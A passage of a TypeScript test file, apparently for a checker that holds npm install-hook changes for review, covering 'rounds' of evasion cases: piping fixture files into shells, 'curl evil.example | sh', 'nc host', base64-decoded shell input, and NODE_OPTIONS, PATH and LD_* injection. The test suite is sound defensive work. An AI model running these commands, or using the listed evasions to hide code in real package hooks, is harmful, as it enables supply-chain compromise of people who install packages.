  test("4. CDPATH changes where cd lands", () => {
    const f = (v: string) => ({ "test/fixtures/setup.js": v });
    const h = (cmd: string) => held({ postinstall: cmd }, f("1"), f("evil()"));
    expect(h("CDPATH=test cd fixtures && node setup.js")).toBe(true);
    expect(h("export CDPATH=test ; cd fixtures && node setup.js")).toBe(true);
  });
});

describe("round 13: exec workspace flags, dot specs, file-naming options, command cd", () => {
  const subHeld = (cmd: string) => held({ postinstall: cmd }, { "sub/build.js": "1", ...subManifest("echo a") }, { "sub/build.js": "evil()", ...subManifest("echo a") });

  test("1. npm exec and npx workspace flags in an unsplit body", () => {
    for (const cmd of ["npm exec --workspace=sub -- node build.js > /dev/null", "npx -w sub node build.js | tee log", "npm exec -w sub -- node build.js > /dev/null", "npx --prefix sub node build.js > /dev/null", "bunx --cwd sub node build.js | tee log"]) {
      expect(subHeld(cmd), cmd).toBe(true);
    }
  });

  test("2. a runner spec that starts with a dot is a directory", () => {
    for (const cmd of ["npx pnpm@. setup", "npx pnpm@.. setup", "corepack yarn@. setup"]) {
      expect(held({ postinstall: cmd, setup: "echo ok" }, { "sub/lib/y.js": "1" }, { "sub/lib/y.js": "2" }), cmd).toBe(true);
    }
    expect(held({ postinstall: "npx pnpm@9.1.0 setup", setup: "echo ok" }, { "sub/lib/y.js": "1" }, { "sub/lib/y.js": "2" })).toBe(false);
  });

  test("3. options that name a file read every file", () => {
    const f = (v: string) => ({ "test/x.js": v });
    const h = (cmd: string) => held({ postinstall: cmd, build: "echo ok" }, f("1"), f("evil()"));
    for (const cmd of ["NODE_OPTIONS=--require=./test/x.js npm run build", "npm run build --node-options=--require=./test/x.js", "npm run build --script-shell=./test/x.js", "npm run build --userconfig ./test/x.js"]) {
      expect(h(cmd), cmd).toBe(true);
    }
  });

  test("4. command cd and builtin cd move the base", () => {
    const f = (v: string) => ({ "docs/gen.js": v });
    const h = (cmd: string) => held({ postinstall: cmd }, f("1"), f("evil()"));
    expect(h("command cd tools > /dev/null && cd ../docs && node gen.js")).toBe(true);
    expect(h("builtin cd tools && cd ../docs && node gen.js")).toBe(true);
  });

  test("5. pnpm recursive is a workspace form", () => {
    expect(manifestHeld("pnpm recursive run build")).toBe(true);
  });
});

describe("round 14: comment after an escaped space, ANSI-C quotes, shell sinks, PATH, script-arg runners", () => {
  const testHeld = (cmd: string, extra: Record<string, string> = {}) => held({ postinstall: cmd, build: "echo ok" }, { "test/setup.js": "1", ...extra }, { "test/setup.js": "evil()", ...extra });

  test("1. an escaped space before a hash does not start a comment", () => {
    expect(testHeld("node a.js \\ #; cd test > /dev/null && node setup.js", { "a.js": "1" })).toBe(true);
    // An unescaped one still does.
    expect(testHeld("node a.js > /dev/null # cd test && node setup.js", { "a.js": "1" })).toBe(false);
  });

  test("2. ANSI-C quoting reads every file", () => {
    // The text between the reopened quote and the next one is quoted to a naive scan, and the quotes balance.
    expect(testHeld("echo $'\\'' > /dev/null; cd test && node setup.js; echo '")).toBe(true);
    expect(testHeld("echo \"$(echo $'\\'')\" > /dev/null; cd test && node setup.js; echo '")).toBe(true);
  });

  test("3. a bare shell fed from a file or a non-literal producer is unsure", () => {
    // A changed file elsewhere in the package (not under test/ or docs/) is what the unread text could run.
    const h = (cmd: string, extra: Record<string, string>) => held({ postinstall: cmd }, { "lib/setup.js": "1", ...extra }, { "lib/setup.js": "evil()", ...extra });
    for (const cmd of ["sh < scripts/x.sh", "cat scripts/x.sh | sh", "echo aGk= | base64 -d | sh", "cat x | bash"]) {
      expect(h(cmd, { "scripts/x.sh": "echo hi\n", x: "1" }), cmd).toBe(true);
    }
    expect(h("echo 'node ./a.js' | sh", { "a.js": "1" })).toBe(false);
  });

  test("4. PATH, HOME and the startup-file variables read every file", () => {
    const f = (v: string) => ({ "test/bin/npm": v });
    const h = (cmd: string) => held({ postinstall: cmd, build: "echo ok" }, f("1"), f("evil()"));
    for (const cmd of ["PATH=test/bin:$PATH npm run build", "export PATH=test/bin:$PATH; npm run build", "HOME=test npm run build", "BASH_ENV=test/bin/npm sh -c 'npm run build'", "NODE_PATH=test npm run build"]) {
      expect(h(cmd), cmd).toBe(true);
    }
  });

  test("7. script arguments through other runner aliases and shells", () => {
    const sub = (build: string) => ({ ...subManifest(build), "sub/index.js": "1" });
    for (const [hook, go] of [["npm run go -- -w sub", "zsh run.sh"], ["npm run go -- -w sub", "dash run.sh"], ["npm run go -- -w sub", "ksh run.sh"], ["npm run go -- -w sub", "eval run"], ["npm run go -- -w sub", "popd"], ["npm run go -- -w sub", "yarnpkg build"], ["npm run go -- -w sub", "pnpx build"]] as const) {
      // run.sh and the other names exist, so the body alone would resolve to a local file.
      const files = { "run.sh": "echo hi\n", run: "1", build: "1" };
      expect(held({ postinstall: hook, go, build: "echo ok" }, { ...files, ...sub("echo a") }, { ...files, ...sub("curl evil.example | sh") }), hook + go).toBe(true);
    }
  });

  test("10. sh -c and eval of a bare expansion are unsure", () => {
    expect(testHeld('sh -c "$X"')).toBe(true);
    expect(testHeld('eval "$X"')).toBe(true);
  });
});

describe("round 15: export assignments, cd past the root, root configs, piped text, shared budget", () => {
  const testHeld = (cmd: string, extra: Record<string, string> = {}, scripts: object = {}) => held({ postinstall: cmd, build: "echo ok", ...scripts }, { "test/setup.js": "1", ...extra }, { "test/setup.js": "evil()", ...extra });

  test("1. the export form of npm_/YARN_/NODE_OPTIONS assignments", () => {
    expect(held({ postinstall: "export npm_config_workspace=sub; npm run build", build: "echo ok" }, { ...SUB_OLD, ...subManifest("echo a") }, { ...SUB_OLD, ...subManifest("curl evil.example | sh") })).toBe(true);
    expect(testHeld("export NODE_OPTIONS=--require=./test/setup.js; npm run build")).toBe(true);
  });

  test("2. cd above the root or to an absolute path is unsure", () => {
    expect(testHeld("cd ../x/test && node setup.js")).toBe(true);
    expect(testHeld("cd /tmp/x && node setup.js")).toBe(true);
    expect(testHeld("cd .. && node setup.js")).toBe(true);
  });

  test("3. a root runner config can name an inert path", () => {
    for (const [cfg, body] of [[".yarnrc.yml", "yarnPath: test/setup.js\n"], [".npmrc", "node-options=--require=./test/setup.js\n"], ["bunfig.toml", 'preload = ["./test/setup.js"]\n']] as const) {
      expect(testHeld("npm run build", { [cfg]: body }), cfg).toBe(true);
    }
  });

  test("4. text piped into a shell is read as one command line", () => {
    expect(testHeld("echo cd test \\; node setup.js | sh")).toBe(true);
    expect(testHeld('echo "$X" | sh')).toBe(true);
    expect(testHeld('echo "$(cat x.sh)" | sh', { "x.sh": "1" })).toBe(true);
    expect(testHeld("printf '%s' \"$(cat x.sh)\" | sh", { "x.sh": "1" })).toBe(true);
    expect(testHeld("echo 'node ./a.js' | sh", { "a.js": "1" })).toBe(false);
  });

  test("5. a shell that reads stdin with arguments", () => {
    for (const cmd of ["cat x.sh | bash -s -- arg", "cat x.sh | sh -s x y", "cat x.sh | bash /dev/stdin", "cat x.sh | sh -"]) {
      expect(held({ postinstall: cmd }, { "lib/setup.js": "1", "x.sh": "echo hi\n" }, { "lib/setup.js": "evil()", "x.sh": "echo hi\n" }), cmd).toBe(true);
    }
  });

  test("6. library path variables and the zsh path array", () => {
    for (const cmd of ["LD_LIBRARY_PATH=test node a.js", "DYLD_LIBRARY_PATH=test node a.js", "DYLD_FRAMEWORK_PATH=test node a.js", "path=(test $path); node a.js"]) {
      expect(testHeld(cmd, { "a.js": "1" }), cmd).toBe(true);
    }
  });

  test("7. quoted nested substitutions stay within one shared budget", () => {
    let s = "cd test && node setup.js";
    for (let i = 0; i < 14; i++) s = `echo "$(${s})"`;
    const t0 = Date.now();
    expect(testHeld(s)).toBe(true);
    expect(Date.now() - t0).toBeLessThan(30000);
    let q = "echo ok";
    for (let i = 0; i < 40; i++) q = `echo "$(${q} "$(echo a)" "$(echo b)")"`;
    const t1 = Date.now();
    testHeld(q);
    expect(Date.now() - t1).toBeLessThan(30000);
  });
});

describe("round 16: wrapped stdin sinks, node stdin, more library variables", () => {
  const fed = (cmd: string) => held({ postinstall: cmd }, { "lib/setup.js": "1", "x.sh": "echo hi\n" }, { "lib/setup.js": "evil()", "x.sh": "echo hi\n" });

  test("1. a wrapper in front of the shell sink", () => {
    for (const cmd of ["cat x.sh | env sh", "cat x.sh | command sh", "cat x.sh | exec sh", "cat x.sh | sudo sh", "cat x.sh | sudo -u root bash", "cat x.sh | busybox sh", "cat x.sh | env -i FOO=1 sh", "cat x.sh | xargs -0 bash -c", "cat x.sh | nohup sh"]) {
      expect(fed(cmd), cmd).toBe(true);
    }
  });

  test("2. node as a stdin interpreter", () => {
    for (const cmd of ["cat x.js | node", "node < x.js", "node - < x.js", "cat x.js | env node", "cat x.js | node --require ./a.js"]) {
      expect(fed(cmd), cmd).toBe(true);
    }
    expect(fed("echo hi | node -e 'console.log(1)'")).toBe(false);
  });

  test("3. library variables", () => {
    for (const v of ["DYLD_FALLBACK_LIBRARY_PATH", "DYLD_FALLBACK_FRAMEWORK_PATH", "LD_AUDIT"]) {
      expect(fed(`${v}=lib node a.js`), v).toBe(true);
    }
  });
});

describe("round 17: unknown flags keep dispatching, += assignments, directory allowlist, more interpreters", () => {
  const testHeld = (cmd: string, extra: Record<string, string> = {}, scripts: object = {}) => held({ postinstall: cmd, build: "node test/x.js", ...scripts }, { "test/x.js": "1", ...extra }, { "test/x.js": "evil()", ...extra });
  const fed = (cmd: string) => held({ postinstall: cmd }, { "lib/setup.js": "1", "x.sh": "echo hi\n" }, { "lib/setup.js": "evil()", "x.sh": "echo hi\n" });

  test("1. an unknown flag still dispatches the command", () => {
    expect(testHeld("npm --color=false run build")).toBe(true);
    expect(testHeld("npm --foo run build")).toBe(true);
    expect(testHeld("npm --foo=1 --color run build")).toBe(true);
    for (const cmd of ["npm --foo exec evil-pkg", "npm exec --foo evil-pkg", "npm exec --foo -- evil-pkg"]) expect(fed(cmd), cmd).toBe(true);
  });

  test("2. append assignments", () => {
    for (const cmd of ["NODE_OPTIONS+=--require=./test/x.js npm run build", "export NODE_OPTIONS+=--require=./test/x.js; npm run build", "PATH+=:test npm run build", "CDPATH+=:test npm run build", "export PATH+=:test; node a.js"]) {
      expect(testHeld(cmd, { "a.js": "1" }), cmd).toBe(true);
    }
  });

  test("3. a directory with unusual characters is unsure", () => {
    for (const cmd of ["echo test | xargs -I% sh -c 'cd % && node setup.js'", "cd test>/dev/null && node setup.js", "cd \\test && node setup.js", "cd ~ && node setup.js", "cd && node setup.js"]) {
      expect(held({ postinstall: cmd }, { "test/setup.js": "1" }, { "test/setup.js": "evil()" }), cmd).toBe(true);
    }
  });

  test("4. popd without an argument is unsure", () => {
    expect(held({ postinstall: "pushd lib && popd && node setup.js" }, { "test/setup.js": "1", "lib/a.js": "1" }, { "test/setup.js": "evil()", "lib/a.js": "1" })).toBe(true);
  });

  test("5. a yarn PnP file is a runner config", () => {
    expect(testHeld("npm run build", { ".pnp.cjs": "1" })).toBe(true);
    expect(testHeld("npm run build", { ".pnp.loader.mjs": "1" })).toBe(true);
  });

  test("6. sourced files that cd or export", () => {
    expect(held({ postinstall: ". ./x.sh && node a.js" }, { "x.sh": "cd test\n", "test/a.js": "1" }, { "x.sh": "cd test\n", "test/a.js": "evil()" })).toBe(true);
    expect(held({ postinstall: "source x.sh; npm run build", build: "node test/x.js" }, { "x.sh": "export npm_config_workspace=sub\n", "test/x.js": "1" }, { "x.sh": "export npm_config_workspace=sub\n", "test/x.js": "evil()" })).toBe(true);
  });

  test("7. other interpreters as stdin sinks", () => {
    for (const cmd of ["cat x | python3", "cat x | python -", "python3 < x.py", "cat x | python3 -W ignore", "cat x | perl", "perl < x.pl", "cat x | ruby", "cat x | deno run -", "cat x | bun run -", "cat x | env python3", "cat x | sudo perl"]) {
      expect(fed(cmd), cmd).toBe(true);
    }
    for (const cmd of ["echo hi | python3 -c 'print(1)'", "echo hi | perl -e 'print 1'", "echo hi | ruby -e 'p 1'"]) {
      expect(fed(cmd), cmd).toBe(false);
    }
  });
});

describe("round 18: general wrappers, valued interpreter flags, IFS", () => {
  const fed = (cmd: string) => held({ postinstall: cmd }, { "lib/setup.js": "1", "x.sh": "echo hi\n" }, { "lib/setup.js": "evil()", "x.sh": "echo hi\n" });

  test("1. wrappers that are not named", () => {
    for (const cmd of ["cat x.sh | nice sh", "cat x.sh | nice -n 5 sh", "cat x.sh | timeout 5 sh", "cat x.sh | stdbuf -o0 sh", "nice sh < x.sh", "cat x.sh | ionice -c3 bash", "cat x.sh | setsid sh", "cat x.sh | caffeinate sh", "cat x.sh | arch -arm64 zsh", "cat x.js | chrt 1 node"]) {
      expect(fed(cmd), cmd).toBe(true);
    }
  });

  test("2. more interpreters and valued flags", () => {
    for (const cmd of ["cat x.js | bun -", "cat x.js | deno run -", "cat x.sh | python3", "cat x | perl", "cat x | ruby", "cat x | php", "cat x.js | node --stack-size 100", "cat x.js | node --max-old-space-size=100"]) {
      expect(fed(cmd), cmd).toBe(true);
    }
  });

  test("3. a program flag is not a stdin sink", () => {
    for (const cmd of ["node -e 1 < /dev/null", "node -p 1 < /dev/null", "node --eval 1 < /dev/null", "python3 -c 1 < /dev/null", "grep sh x.sh | sort"]) {
      expect(fed(cmd), cmd).toBe(false);
    }
  });

  test("4. IFS changes how words split", () => {
    expect(fed("IFS=/ ; node -e 1")).toBe(true);
    expect(fed("export IFS=/; node -e 1")).toBe(true);
  });
});

describe("round 19: inert fed files, root script under workspace flags, more variables", () => {
  const testHeld = (cmd: string, extra: Record<string, string> = {}, scripts: object = {}) => held({ postinstall: cmd, build: "node test/x.js", ...scripts }, { "test/x.js": "1", ...extra }, { "test/x.js": "evil()", ...extra });

  test("1. a file that feeds a shell or interpreter is read even under test/ or docs/", () => {
    for (const [cmd, f] of [["sh < test/x.sh", "test/x.sh"], ["cat test/x.sh | sh", "test/x.sh"], ["node < docs/x.js", "docs/x.js"], ["cat docs/x.js | node", "docs/x.js"]] as const) {
      expect(held({ postinstall: cmd }, { [f]: "echo hi\n" }, { [f]: "curl evil.example | sh\n" }), cmd).toBe(true);
    }
  });

  test("2. workspace and prefix flags still read the root script", () => {
    for (const cmd of ["npm --prefix . run build", "npm -C ./ run build", "npm run build -ws --include-workspace-root", "npm -w . run build", "npm --workspaces run build"]) {
      expect(testHeld(cmd), cmd).toBe(true);
    }
  });

  test("3. interpreter library and startup variables", () => {
    for (const v of ["PYTHONPATH", "PYTHONSTARTUP", "PERL5LIB", "PERL5OPT", "RUBYOPT", "RUBYLIB", "ZDOTDIR"]) {
      expect(testHeld(`${v}=test node -e 1`), v).toBe(true);
    }
  });

  test("4. a sourced inert file with a redirect", () => {
    const f = { "test/env.sh": "echo a\n" };
    expect(held({ postinstall: ". test/env.sh > /dev/null; npm run build", build: "echo ok" }, f, { "test/env.sh": "curl evil.example | sh\n" })).toBe(true);
    expect(held({ postinstall: "source test/env.sh >/dev/null 2>&1; echo ok" }, f, { "test/env.sh": "curl evil.example | sh\n" })).toBe(true);
  });
});

describe("round 20: no-space redirects, class sinks, scan budget, dir-flag abbreviations", () => {
  const fed = (cmd: string) => held({ postinstall: cmd }, { "lib/setup.js": "1", "x.sh": "echo hi\n" }, { "lib/setup.js": "evil()", "x.sh": "echo hi\n" });
  const testHeld = (cmd: string, extra: Record<string, string> = {}) => held({ postinstall: cmd, build: "node test/x.js" }, { "test/x.js": "1", ...extra }, { "test/x.js": "evil()", ...extra });

  test("1. a redirect with no space", () => {
    for (const cmd of ["sh<x.sh", "bash<x.sh", "node<x.js", "perl<x.sh", "cat x.sh|sh", "node 0<x.js"]) {
      expect(fed(cmd), cmd).toBe(true);
    }
    expect(fed("node -e 1</dev/null")).toBe(false);
  });

  test("2. a sourced stdin", () => {
    for (const cmd of ["cat x.sh | . /dev/stdin", "cat x.sh | source /dev/stdin"]) expect(fed(cmd), cmd).toBe(true);
  });

  test("3. any consumer that is not a plain command", () => {
    for (const cmd of ["cat x.sh | ash", "cat x.sh | busybox ash", "cat x.sh | mksh", "cat x.sh | yash", "cat x.sh | fish", "cat x.sh | csh", "cat x.sh | tcsh", "cat x.js | tsx", "cat x.js | ts-node", "cat x.lua | lua -", "cat x.tcl | tclsh", "cat x.sh | env -S 'sh -s'", "cat x.sh | env -S sh"]) {
      expect(fed(cmd), cmd).toBe(true);
    }
  });

  test("4. plain consumers and literal producers stay quiet", () => {
    for (const cmd of ["cat x.sh | grep hi", "cat x.sh | sort | uniq", "curl -s u | tar x", "echo hi | tee out", "echo hi | sh", "npm ls | head -3", "cat x.sh | jq ."]) {
      expect(fed(cmd), cmd).toBe(false);
    }
  });

  test("5. many valued long flags do not blow up the interpreter scan", () => {
    const flags = Array.from({ length: 40 }, (_, i) => `--f${i} 1`).join(" ");
    const t = Date.now();
    expect(fed(`cat x | node ${flags} -e 1`)).toBe(false);
    expect(fed(`cat x | node ${flags}`)).toBe(true);
    expect(Date.now() - t).toBeLessThan(10000);
  });

  test("6. abbreviated and joined directory flags", () => {
    for (const cmd of ["npm --prefi test run build", "npm --workspace=test run build", "npm -sw test run build", "npm --prefi test exec node x.js"]) {
      expect(testHeld(cmd), cmd).toBe(true);
    }
  });

  test("7. a quiet flag with a separate value before exec", () => {
    for (const cmd of ["npm --loglevel silent exec evil-pkg", "npm -j 4 exec evil-pkg", "npm --loglevel silent exec -- evil-pkg"]) expect(fed(cmd), cmd).toBe(true);
    expect(testHeld("npm --loglevel silent run build")).toBe(true);
  });
});

describe("round 21: a sourced inert file inside a nested shell string", () => {
  test("1. sh -c '. test/x.sh'", () => {
    const o = { "test/x.sh": "echo a\n" }, n = { "test/x.sh": "curl evil.example | sh\n" };
    for (const cmd of ["sh -c '. test/x.sh'", "bash -c 'source test/x.sh'", "sh -c '. test/x.sh > /dev/null'", "sh -c \"cd . && . test/x.sh\"", "env sh -c '. test/x.sh'"]) {
      expect(held({ postinstall: cmd }, o, n), cmd).toBe(true);
    }
  });
});

describe("round 22: network and program-reading consumers, pipeline files, readsStdin options", () => {
  const fed = (cmd: string) => held({ postinstall: cmd }, { "lib/setup.js": "1", "x.sh": "echo hi\n" }, { "lib/setup.js": "evil()", "x.sh": "echo hi\n" });
  const inertFed = (cmd: string, f = "test/x.sh") => held({ postinstall: cmd }, { [f]: "echo a\n" }, { [f]: "curl evil.example | sh\n" });

  test("1. consumers that take a program from stdin or a remote shell", () => {
    for (const cmd of ["cat x.sh | ssh localhost sh", "cat x.sh | ssh localhost", "cat x.mk | make -f -", "cat x.awk | awk -f -", "cat x.awk | gawk -f /dev/stdin", "cat x.awk | mawk -f -", "cat x | nc host 1", "cat x.sh | rsync -e sh a b"]) {
      expect(fed(cmd), cmd).toBe(true);
    }
  });

  test("2. quiet tools that turn a changed file into code", () => {
    const keep = { "build.js": "1\n", "y.js": "1\n" };
    for (const [cmd, f] of [["cat test/x.diff | patch -p0 && node build.js", "test/x.diff"], ["git apply < test/x.diff && node build.js", "test/x.diff"], ["cat test/x.txt | tee build.js > /dev/null && node build.js", "test/x.txt"], ["base64 -d < test/x.b64 > y.js && node y.js", "test/x.b64"]] as const) {
      expect(held({ postinstall: cmd }, { [f]: "a\n", ...keep }, { [f]: "b\n", ...keep }), cmd).toBe(true);
    }
  });

  test("3. process substitution and ash without a pipe", () => {
    expect(inertFed("sh <(cat test/x.sh)")).toBe(true);
    expect(inertFed("ash<test/x.sh")).toBe(true);
  });

  test("4. every file in a pipeline is read, redirects included", () => {
    for (const cmd of ["cat < test/x.sh | sh", "cat test/x.sh | cat | sh", "cat test/x.sh | tr a b | bash"]) expect(inertFed(cmd), cmd).toBe(true);
  });

  test("5. shell options before the script operand", () => {
    for (const cmd of ["cat x.sh | bash --rcfile /dev/null", "cat x.sh | bash --init-file /dev/null", "cat x.sh | bash -s -- -c", "cat x.sh | sh -s -- -c x"]) expect(fed(cmd), cmd).toBe(true);
    expect(fed("sh x.sh -s")).toBe(false);
  });
});

describe("round 23: npm exec command with flags after it, abbreviated call flags, eval source", () => {
  const inert = (cmd: string, f: string, extra: Record<string, string> = {}) => held({ postinstall: cmd }, { [f]: "echo a\n", ...extra }, { [f]: "curl evil.example | sh\n", ...extra });

  test("1. the command word of npm exec is read when flags follow it", () => {
    expect(inert("npm exec ./test/run.js -w sub", "test/run.js")).toBe(true);
    expect(inert("npm exec ./test/run.js --workspace=sub", "test/run.js")).toBe(true);
    expect(inert("npm exec ./test/run.js --foo", "test/run.js")).toBe(true);
  });

  test("2. shortened and clustered call flags run a shell body", () => {
    for (const cmd of ["npm exec --cal 'cd test && node setup.js'", "npm exec --call='cd test && node setup.js'", "npm exec -yc 'cd test && node setup.js'", "npm exec -y -c 'cd test && node setup.js'"]) {
      expect(inert(cmd, "test/setup.js"), cmd).toBe(true);
    }
  });

  test("3. a file sourced inside eval or a nested string", () => {
    for (const cmd of ["eval '. test/env.sh' >/dev/null", "eval 'source test/env.sh'", "eval \". test/env.sh\"; echo ok", "sh -c \"eval '. test/env.sh'\""]) {
      expect(inert(cmd, "test/env.sh"), cmd).toBe(true);
    }
  });

  test("4. an npm runner config alone holds", () => {
    expect(held({ postinstall: "npm run build", build: "echo ok" }, { ".npmrc": "a=1\n" }, { ".npmrc": "node-options=--require=./x.js\n", "x.js": "evil()" })).toBe(true);
  });
});

describe("round 24: redirects, here-strings, runners as consumers, stdin paths, xargs, output substitution", () => {
  const inert = (cmd: string, f = "test/x.sh", extra: Record<string, string> = {}) => held({ postinstall: cmd }, { [f]: "echo a\n", ...extra }, { [f]: "curl evil.example | sh\n", ...extra });

  test("1. a descriptor redirect does not end the pipeline", () => {
    for (const cmd of ["cat test/x.sh 2>&1 | sh", "cat test/x.sh >&2 | sh", "cat test/x.sh 2>/dev/null | sh", "cat test/x.sh &> /dev/null | sh"]) expect(inert(cmd), cmd).toBe(true);
  });

  test("2. a here-string with an expansion", () => {
    for (const cmd of ['sh <<< "$(cat test/x.sh)"', "bash <<< `cat test/x.sh`", "node <<< \"$(cat test/x.sh)\""]) expect(inert(cmd), cmd).toBe(true);
    expect(inert("sh <<< 'cd test && node setup.js'", "test/setup.js")).toBe(true);
  });

  test("3. runners and stream editors that run a fed file", () => {
    for (const cmd of ["cat test/x.sh | npm exec -- sh", "cat test/x.sh | pnpm exec sh", "cat test/x.sh | yarn dlx sh", "cat test/x.sh | sed e", "tar -x --to-command=sh -f test/x.tar", "find test -name x.sh -exec sh {} \\;"]) {
      expect(inert(cmd, cmd.includes("tar") ? "test/x.tar" : "test/x.sh"), cmd).toBe(true);
    }
  });

  test("4. /dev/stdin and /dev/fd/0 operands", () => {
    for (const cmd of ["cat test/x.js | node /dev/stdin", "bash /dev/fd/0 < test/x.sh", "cat test/x.sh | bash /dev/fd/0", "cat test/x.php | php -f php://stdin"]) {
      expect(inert(cmd, cmd.includes("php") ? "test/x.php" : cmd.includes("x.js") ? "test/x.js" : "test/x.sh"), cmd).toBe(true);
    }
  });

  test("5. xargs hands lines to a shell", () => {
    expect(inert("echo test/x.sh | xargs sh")).toBe(true);
    expect(inert("cat test/list | xargs bash", "test/list")).toBe(true);
  });

  test("6. an output process substitution", () => {
    expect(inert("cat test/x.sh > >(sh)")).toBe(true);
  });

  test("7. a file written then run, and tee that is not run", () => {
    const keep = { "build.js": "1\n" };
    expect(inert("cat test/x.js > build.js && node build.js", "test/x.js", keep)).toBe(true);
    expect(inert("npx --yes --cal 'sh test/x.sh'")).toBe(true);
    expect(inert("bash --rcfile test/x.sh -i")).toBe(true);
    expect(held({ postinstall: "node build.js 2>&1 | tee log.txt" }, { "build.js": "1\n", "lib/a.js": "1\n" }, { "build.js": "1\n", "lib/a.js": "evil()\n" })).toBe(false);
  });
});

describe("round 25: stages with redirects, written files run by path, fed files' own content, program flags", () => {
  const inert = (cmd: string, f = "test/x.sh", extra: Record<string, string> = {}, scripts: object = {}) => held({ postinstall: cmd, ...scripts }, { [f]: "echo a\n", ...extra }, { [f]: "curl evil.example | sh\n", ...extra });

  test("1. a shell given a script file in a stage with a redirect or after a lone &", () => {
    for (const cmd of ["sh test/x.sh > /dev/null", "sh test/x.sh &>/dev/null", "sleep 0 & sh test/x.sh", "echo a >&2 && sh test/x.sh", "true >| /dev/null || sh test/x.sh", "true &&>/dev/null sh test/x.sh", "sh test/x.sh 2>&1"]) {
      expect(inert(cmd), cmd).toBe(true);
    }
  });

  test("2. a written file run by path", () => {
    const keep = { "b.js": "1\n" };
    for (const [cmd, f] of [["cat test/x.sh > run.sh && sh ./run.sh", "test/x.sh"], ["cat test/x.sh > run.sh && chmod +x run.sh && ./run.sh", "test/x.sh"], ["cat test/x.js >> b.js && node ./b.js", "test/x.js"], ["cat test/x.js >| b.js && node b.js", "test/x.js"], ["cp test/x.js b.js >/dev/null && node b.js", "test/x.js"], ["mv test/x.js b.js && node ./b.js", "test/x.js"]] as const) {
      expect(inert(cmd, f, keep), cmd).toBe(true);
    }
  });

  test("3. here-string text, find into xargs, a numbered descriptor, a path as the command word of a substitution", () => {
    for (const cmd of ["sh <<< 'sh test/x.sh'", "find test -name '*.sh' | xargs -I{} sh {}", "node /dev/fd/3 3< test/x.js", "sh <(./test/x.sh)"]) {
      expect(inert(cmd, cmd.includes("x.js") ? "test/x.js" : "test/x.sh"), cmd).toBe(true);
    }
  });

  test("4. a fed file's own content is read", () => {
    const unchanged = { "scripts/x.sh": "node test/x.js\n" };
    expect(held({ postinstall: "sh < scripts/x.sh" }, { ...unchanged, "test/x.js": "1\n" }, { ...unchanged, "test/x.js": "evil()\n" })).toBe(true);
    expect(held({ postinstall: "cat scripts/x.sh | sh" }, { ...unchanged, "test/x.js": "1\n" }, { ...unchanged, "test/x.js": "evil()\n" })).toBe(true);
    const list = { "scripts/list": "docs/b.js\n" };
    expect(held({ postinstall: "cat scripts/list | xargs node" }, { ...list, "docs/b.js": "1\n" }, { ...list, "docs/b.js": "evil()\n" })).toBe(true);
  });

  test("5. a program that reads stdin through its own code flag", () => {
    for (const cmd of ["cat test/x.js | node -e \"eval(require('fs').readFileSync(0,'utf8'))\"", "cat test/x.sh | bash -c '. /dev/stdin'", "cat test/x.py | python3 -c 'import sys; exec(sys.stdin.read())'"]) {
      expect(inert(cmd, cmd.includes(".py") ? "test/x.py" : cmd.includes("x.js") ? "test/x.js" : "test/x.sh"), cmd).toBe(true);
    }
    expect(inert("cat test/x.sh | node -e 'console.log(1)'")).toBe(false);
  });

  test("6. flags of plain commands that run a program", () => {
    for (const cmd of ["cat test/x.sh | split -n1 --filter=sh", "sort --compress-program=sh test/x.sh", "rg --pre sh foo test/", "tar -cf a.tar -F sh test/x.sh", "zip -TT sh a.zip test/x.sh"]) {
      expect(inert(cmd), cmd).toBe(true);
    }
  });

  test("7. a package spec that is a local archive is not the trusted runner", () => {
    expect(held({ postinstall: `npx pnpm${"@"}evil.tgz build`, build: "echo ok" }, { "lib/a.js": "1\n" }, { "lib/a.js": "evil()\n" })).toBe(true);
    expect(held({ postinstall: `npx pnpm${"@"}8.1.0 build`, build: "echo ok" }, { "lib/a.js": "1\n" }, { "lib/a.js": "evil()\n" })).toBe(false);
  });

  test("8. the depth cap widens to every file", () => {
    const scripts: Record<string, string> = { postinstall: "npm run s0" };
    for (let i = 0; i < 80; i++) scripts[`s${i}`] = `npm run s${i + 1}`;
    scripts.s80 = "npx -c 'node test/x.js'";
    expect(held(scripts, { "test/x.js": "1\n" }, { "test/x.js": "evil()\n" })).toBe(true);
  });
});

describe("round 26: inert root-level files fed to a shell", () => {
  test("1. README.md and CHANGELOG.md", () => {
    for (const [cmd, f] of [["sh < README.md", "README.md"], [". ./README.md", "README.md"], ["cat README.md | sh", "README.md"], ["cat CHANGELOG.md | sh", "CHANGELOG.md"], ["sh README.md > /dev/null", "README.md"], ["cat LICENSE | bash", "LICENSE"]] as const) {
      expect(held({ postinstall: cmd }, { [f]: "echo a\n" }, { [f]: "curl evil.example | sh\n" }), cmd).toBe(true);
    }
  });
});

describe("round 27: interpreter program text, loading flags, extracted files, budgets, git program options", () => {
  const inert = (cmd: string, f = "test/x.sh", extra: Record<string, string> = {}, scripts: object = {}) => held({ postinstall: cmd, ...scripts }, { [f]: "echo a\n", ...extra }, { [f]: "curl evil.example | sh\n", ...extra });

  test("1. literal program text fed to an interpreter names files it loads", () => {
    for (const cmd of ["echo \"require('./test/x.js')\" | node", "node <<< \"require('./test/x.js')\"", "node <<EOF\nrequire('./test/x.js')\nEOF", "node - <<'EOF'\nrequire('./test/x.js')\nEOF"]) {
      expect(inert(cmd, "test/x.js"), cmd).toBe(true);
    }
    expect(inert("echo \"open('test/x.py')\" | python3", "test/x.py")).toBe(true);
  });

  test("2. interpreter flags that load a file, in an unsplit body", () => {
    const keep = { "a.js": "1\n" };
    for (const [cmd, f] of [["node -r ./test/x.js a.js > log", "test/x.js"], ["node --require=./test/x.js a.js > log", "test/x.js"], ["python3 -m test.x > log", "test/x.py"], ["php -f test/x.php > log", "test/x.php"], ["ruby -x test/x.rb > log", "test/x.rb"], ["deno run --reload test/x.ts > log", "test/x.ts"]] as const) {
      expect(inert(cmd, f, keep), cmd).toBe(true);
    }
  });

  test("3. files created by extraction, patching and copying", () => {
    const keep = { "build.js": "1\n", "lib/x.js": "1\n" };
    for (const [cmd, f] of [["tar -xf test/x.tar > /dev/null && node build.js", "test/x.tar"], ["unzip test/x.zip > /dev/null && node build.js", "test/x.zip"], ["patch -p0 -i test/x.diff > /dev/null && node build.js", "test/x.diff"], ["git apply test/x.diff > /dev/null && node build.js", "test/x.diff"], ["cp test/x.js lib/ > /dev/null && node lib/x.js", "test/x.js"], ["cp -t lib test/x.js > /dev/null && node lib/x.js", "test/x.js"]] as const) {
      expect(inert(cmd, f, keep), cmd).toBe(true);
    }
  });

  test("4. more fed scripts than the budget reads every file", () => {
    const n = 70;
